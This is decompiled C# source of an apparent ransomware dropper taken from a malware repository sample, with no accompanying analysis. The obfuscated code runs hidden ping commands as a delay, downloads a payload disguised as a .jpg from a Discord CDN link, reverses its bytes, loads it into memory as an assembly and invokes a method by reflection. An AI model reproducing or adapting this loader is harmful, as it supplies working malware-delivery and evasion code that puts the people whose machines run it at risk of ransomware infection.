// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Ludpxmj, Version=10.0.45215.0, Culture=neutral, PublicKeyToken=null
// MVID: D6D4D9C7-4070-4207-E386-855DD7A0542D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-222ec0d11854ff17251acc457268745b9a0cc3e94c6e6534aa4a8476e713a231.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

internal sealed class \u0002
{
  public \u0002()
  {
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  internal static void \u0002()
  {
    int num1;
    if (true)
      num1 = 0;
    while (true)
    {
      int num2;
      do
      {
        int num3 = num1 < 5 ? 1 : 0;
        if (true)
          goto label_7;
label_5:
        bool flag;
        if (flag)
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            Arguments = "/c ping bing.com",
            WindowStyle = ProcessWindowStyle.Hidden
          }).WaitForExit();
          num2 = num1 + 1;
          continue;
        }
        goto label_6;
label_7:
        flag = num3 != 0;
        goto label_5;
      }
      while (false);
      num1 = num2;
    }
label_6:;
  }

  internal static List<byte> \u0002()
  {
    List<byte> byteList1 = new List<byte>();
    List<byte> byteList2;
    if (true)
      byteList2 = byteList1;
    while (byteList2.Count == 0)
    {
      try
      {
        byte[] numArray1 = new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/913584216825028612/944251897865465866/Ludpxmj.jpg").GetResponse().GetResponseStream()).ReadBytes(84871300);
        if (true)
          goto label_4;
label_3:
        int index;
        if (true)
          index = 0;
        byte[] numArray2;
        for (; index < numArray2.Length; ++index)
        {
          byte num = numArray2[index];
          byteList2.Add(num);
        }
        continue;
label_4:
        numArray2 = numArray1;
        goto label_3;
      }
      catch
      {
      }
    }
    byteList2.Reverse();
    return byteList2;
  }

  internal static void \u0003()
  {
    try
    {
      if (true)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
    catch
    {
    }
    Thread.GetDomain().Load(\u0002.\u0002().ToArray());
  }

  internal static void \u0005()
  {
    Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
    if (true)
      goto label_2;
label_1:
    int index;
    if (true)
      index = 0;
    Assembly[] assemblyArray;
    for (; index < assemblyArray.Length; ++index)
    {
      Assembly assembly1 = assemblyArray[index];
      if (true)
        goto label_7;
label_5:
      Assembly assembly2;
      if (assembly2.GetTypes().Length != 0)
      {
        foreach (Type type in assembly2.GetTypes())
        {
          foreach (MethodInfo method in type.GetMethods())
          {
            if (method.Name == "Daqnipmtgydemcahwxulg")
            {
              string str = (string) method.Invoke((object) null, (object[]) null);
              if (str.Length > 10)
                Console.WriteLine(str);
            }
          }
        }
        continue;
      }
      continue;
label_7:
      assembly2 = assembly1;
      goto label_5;
    }
    return;
label_2:
    assemblyArray = assemblies;
    goto label_1;
  }
}
